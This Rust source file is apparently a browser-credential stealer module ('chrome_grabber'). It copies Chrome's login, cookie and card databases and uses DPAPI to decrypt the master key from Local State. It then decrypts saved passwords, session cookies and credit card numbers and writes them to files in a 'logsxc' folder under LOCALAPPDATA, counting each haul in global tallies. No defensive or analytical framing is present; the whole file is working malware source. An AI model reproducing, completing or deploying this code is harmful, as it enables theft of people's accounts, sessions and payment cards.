use crate::chrome_grabber::decryption_core::crypt_unprotect_data;
use crate::chrome_grabber::main::DumperResult;
use crate::chrome_grabber::models::{
    ChromeAccount, ChromeCookie, CreditCard, DecryptedAccount, DecryptedCookie,
    DecryptedCreditCard, LocalState,
};
use app_dirs::{get_app_dir, AppDataType, AppInfo};
use rusqlite::Connection;
use std::fmt::Debug;
use std::fs::File;
use std::io::{BufReader, Read};
use std::path::PathBuf;
use std::{fmt, fs};

impl From<rusqlite::Error> for DumperError {
    fn from(e: rusqlite::Error) -> Self {
        DumperError::SqliteError(e)
    }
}

#[derive(Debug)]
pub enum DumperError {
    SqliteError(rusqlite::Error),
    BrowserNotFound,
    DpapiFailedToDecrypt(u32),
    AesFailedToDecrypt,
    FromUtf8Error,
    IoError,
    JsonError(serde_json::Error),
    Base64Error,
}
use serde::Serialize;

#[derive(Serialize, Clone)]
pub struct Dumper {
    #[serde(skip_serializing)]
    pub app_info: AppInfo,
    local_state_buf: String,
    pub accounts: Vec<DecryptedAccount>,
    pub cookies: Vec<DecryptedCookie>,
    pub creditcards: Vec<DecryptedCreditCard>,
}

impl Debug for Dumper {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        f.debug_struct("Dumper")
            .field("app_info", &self.app_info)
            .field("accounts", &self.accounts)
            .field("cookies", &self.cookies)
            .field("creditcards", &self.creditcards)
            .finish()
    }
}

impl Dumper {
    pub fn new(name: &'static str, author: &'static str) -> Self {
        let name = match name {
            "" => "User Data",
            _ => name,
        };

        Dumper {
            app_info: AppInfo { name, author },
            local_state_buf: String::new(),
            accounts: vec![],
            cookies: vec![],
            creditcards: vec![],
        }
    }
}

impl Dumper {
    const STMT: &'static str = "SELECT action_url, username_value, password_value FROM logins";

    /// Look for the local_state file
    fn find_browser_local_state(&self) -> DumperResult<PathBuf> {
        let path = match self.app_info.name {
            "User Data" => "/Local State",
            _ => "User Data/Local State",
        };

        get_app_dir(AppDataType::UserCache, &self.app_info, path)
            .map_err(|_| DumperError::BrowserNotFound)
    }

    /// Copies the database and writes to a file in /.tmp
    fn cp_login_db(&self) -> DumperResult<PathBuf> {
        let path = match self.app_info.name {
            "User Data" => "/Default/Login Data",
            _ => "User Data/Default/Login Data",
        };

        let path_buf = get_app_dir(AppDataType::UserCache, &self.app_info, path)
            .map_err(|_| DumperError::BrowserNotFound)?;
        let dir = std::env::temp_dir();

        let new_path_buf = PathBuf::from(format!(
            "{}/{}_login_data",
            dir.display(),
            self.app_info.author
        ));
        fs::copy(path_buf, new_path_buf.as_path())?;

        Ok(new_path_buf)
    }

    fn cp_cookies_db(&self) -> DumperResult<PathBuf> {
        let path = match self.app_info.name {
            "User Data" => "/Default/Network/Cookies",
            _ => "User Data/Default/Network/Cookies",
        };

        let path_buf = get_app_dir(AppDataType::UserCache, &self.app_info, path)
            .map_err(|_| DumperError::BrowserNotFound)?;
        let dir = std::env::temp_dir();

        let new_path_buf = PathBuf::from(format!(
            "{}/{}_cookies",
            dir.display(),
            self.app_info.author
        ));
        fs::copy(path_buf, new_path_buf.as_path())?;

        Ok(new_path_buf)
    }

    fn cp_creditcard_database(&self) -> DumperResult<PathBuf> {
        let path = match self.app_info.name {
            "User Data" => "/Default/Web Data",
            _ => "User Data/Default/Web Data",
        };

        let path_buf = get_app_dir(AppDataType::UserCache, &self.app_info, path)
            .map_err(|_| DumperError::BrowserNotFound)?;
        let dir = std::env::temp_dir();

        let new_path_buf = PathBuf::from(format!(
            "{}/{}_webdata",
            dir.display(),
            self.app_info.author
        ));
        fs::copy(path_buf, new_path_buf.as_path())?;

        Ok(new_path_buf)
    }

    /// Tried to read local_state file
    fn read_local_state(&mut self) -> DumperResult<LocalState> {
        let path = self.find_browser_local_state()?;
        let file = File::open(path)?;
        let mut reader = BufReader::new(file);
        reader.read_to_string(&mut self.local_state_buf)?;

        Ok(serde_json::from_str(self.local_state_buf.as_str())
            .map_err(|e| DumperError::JsonError(e))?)
    }

    /// Queries account in sqlite db file
    fn query_accounts(&self) -> DumperResult<Vec<ChromeAccount>> {
        let db_url = self.cp_login_db()?;
        let conn = Connection::open(db_url)?;
        let mut stmt = conn.prepare(Self::STMT)?;

        let chrome_accounts = stmt
            .query_map([], |row| {
                Ok(ChromeAccount::new(row.get(0)?, row.get(1)?, row.get(2)?))
            })?
            .filter_map(|acc| acc.ok())
            .collect();

        Ok(chrome_accounts)
    }

    /// Queries account in sqlite db file
    fn query_creditcard(&self) -> DumperResult<Vec<CreditCard>> {
        let db_url = self.cp_creditcard_database()?;
        let conn = Connection::open(db_url)?;
        let mut stmt = conn.prepare("SELECT card_number_encrypted, name_on_card, expiration_month, expiration_year FROM credit_cards")?;

        let chrome_accounts: Vec<CreditCard> = stmt
            .query_map([], |row| {
                Ok(CreditCard::new(
                    row.get(0)?,
                    row.get(1)?,
                    row.get(2)?,
                    row.get(3)?,
                ))
            })?
            .filter_map(|acc| acc.ok())
            .collect();

        Ok(chrome_accounts)
    }

    /// Queries account in sqlite db file
    fn query_cookies(&self) -> DumperResult<Vec<ChromeCookie>> {
        let db_url = self.cp_cookies_db()?;
        let conn = Connection::open(db_url)?;
        let mut stmt = conn.prepare(
            "SELECT host_key, name, encrypted_value, path, expires_utc, is_secure FROM cookies",
        )?;

        let chrome_accounts = stmt
            .query_map([], |row| {
                Ok(ChromeCookie::new(
                    row.get(0)?,
                    row.get(1)?,
                    row.get(2)?,
                    row.get(3)?,
                    row.get(4)?,
                    row.get(5)?,
                ))
            })?
            .filter_map(|acc| acc.ok())
            .collect();

        Ok(chrome_accounts)
    }

    /// Tries to dump data to struct account vec
    pub fn dump(&mut self) -> DumperResult<()> {
        let local_state = self.read_local_state().ok();
        if let Some(local_state) = local_state {
            let mut decoded_encryption_key =
                base64::decode(local_state.os_crypt.encrypted_key.to_string())
                    .map_err(|_| DumperError::Base64Error)?;

            let mut master_key = crypt_unprotect_data(&mut decoded_encryption_key[5..])?;

            let mut accounts = self
                .query_accounts()?
                .into_iter()
                .filter(|acc| !acc.encrypted_pwd.is_empty() && !acc.website.is_empty())
                .map(|acc| {
                    let res = DecryptedAccount::from_chrome_acc(acc.clone(), None);
                    if let Err(_) = res {
                        DecryptedAccount::from_chrome_acc(
                            acc.clone(),
                            Some(master_key.as_mut_slice()),
                        )
                    } else {
                        res
                    }
                })
                .filter_map(|v| v.ok())
                .collect::<Vec<_>>();

            let mut cookies = self
                .query_cookies()?
                .into_iter()
                .filter(|acc| !acc.encrypted_cookie.is_empty() && !acc.hostkey.is_empty())
                .map(|acc| {
                    let res = DecryptedCookie::from_chrome_acc(acc.clone(), None);
                    if let Err(_) = res {
                        DecryptedCookie::from_chrome_acc(
                            acc.clone(),
                            Some(master_key.as_mut_slice()),
                        )
                    } else {
                        res
                    }
                })
                .filter_map(|v| v.ok())
                .collect::<Vec<_>>();

            let mut credit_card = self
                .query_creditcard()?
                .into_iter()
                .filter(|acc| !acc.encrypted_number.is_empty())
                .map(|acc| {
                    let res = DecryptedCreditCard::from_chrome_acc(acc.clone(), None);
                    if let Err(_) = res {
                        DecryptedCreditCard::from_chrome_acc(
                            acc.clone(),
                            Some(master_key.as_mut_slice()),
                        )
                    } else {
                        res
                    }
                })
                .filter_map(|v| v.ok())
                .collect::<Vec<_>>();

            self.accounts.append(&mut accounts);
            self.cookies.append(&mut cookies);
            self.creditcards.append(&mut credit_card);

            unsafe {
                crate::PASSWORDS += self.accounts.len() as i64;
            }
            unsafe {
                crate::CREDIT_CARDS += self.creditcards.len() as i64;
            }
        } else {
            let mut accounts = self
                .query_accounts()?
                .into_iter()
                .filter(|acc| !acc.encrypted_pwd.is_empty() && !acc.website.is_empty())
                .filter_map(|acc| DecryptedAccount::from_chrome_acc(acc.clone(), None).ok())
                .collect::<Vec<_>>();

            let mut cookies = self
                .query_cookies()?
                .into_iter()
                .filter(|acc| !acc.encrypted_cookie.is_empty() && !acc.hostkey.is_empty())
                .filter_map(|acc| DecryptedCookie::from_chrome_acc(acc.clone(), None).ok())
                .collect::<Vec<_>>();
            let mut cc = self
                .query_creditcard()?
                .into_iter()
                .filter(|acc| !acc.encrypted_number.is_empty())
                .filter_map(|acc| DecryptedCreditCard::from_chrome_acc(acc.clone(), None).ok())
                .collect::<Vec<_>>();

            self.accounts.append(&mut accounts);
            self.cookies.append(&mut cookies);
            self.creditcards.append(&mut cc);

            unsafe {
                crate::PASSWORDS += self.accounts.len() as i64;
            }
            unsafe {
                crate::CREDIT_CARDS += self.creditcards.len() as i64;
            }
        }
        use std::io::Write;

        let appdata = std::env::var("LOCALAPPDATA").unwrap();

        let mut text = self
            .accounts
            .iter()
            .map(|acc| format!("{}: {}:{}", acc.website, acc.username_value, acc.pwd))
            .collect::<Vec<_>>()
            .join("\n");
        text.push_str("\n");
        text.push_str("\n");
        let mut text2 = String::from("");
        text2.push_str("\n");
        text2.push_str(
            &self
                .cookies
                .iter()
                .map(|acc| {
                    format!(
                        "{website}\t{is_secure}\t{path}\tFALSE\t{timestamp}\t{name}\t{value}",
                        website = acc.hostkey,
                        is_secure = match acc.secure {
                            0 => {
                                "FALSE"
                            }
                            1 => {
                                "TRUE"
                            }
                            _ => {
                                "UNKNOWN"
                            }
                        },
                        timestamp = acc.expire_utc,
                        name = acc.name,
                        value = acc.encrypted_cookie,
                        path = acc.path
                    )
                })
                .collect::<Vec<_>>()
                .join("\n"),
        );

        let mut text3 = String::from("");
        text3.push_str(
            &self
                .creditcards
                .iter()
                .map(|acc| {
                    format!(
                        "{} {}/{} Name:{}",
                        acc.encrypted_number,
                        acc.expiration_month,
                        acc.expiration_year,
                        acc.name_on_card
                    )
                })
                .collect::<Vec<_>>()
                .join("\n"),
        );

        if text.as_bytes().len() > 0 {
            std::fs::File::create(format!(
                "{}\\logsxc\\passwords_{}.txt",
                appdata, self.app_info.author
            ))
            .unwrap()
            .write(text.as_bytes())
            .unwrap();
        }
        if text2.as_bytes().len() > 0 {
            std::fs::File::create(format!(
                "{}\\logsxc\\cookies_{}.txt",
                appdata, self.app_info.author
            ))
            .unwrap()
            .write_all(text2.as_bytes())
            .unwrap();
        }
        if text3.as_bytes().len() > 0 {
            std::fs::File::create(format!(
                "{}\\logsxc\\creditcards_{}.txt",
                appdata, self.app_info.author
            ))
            .unwrap()
            .write_all(text3.as_bytes())
            .unwrap();
        }

        Ok(())
    }
}
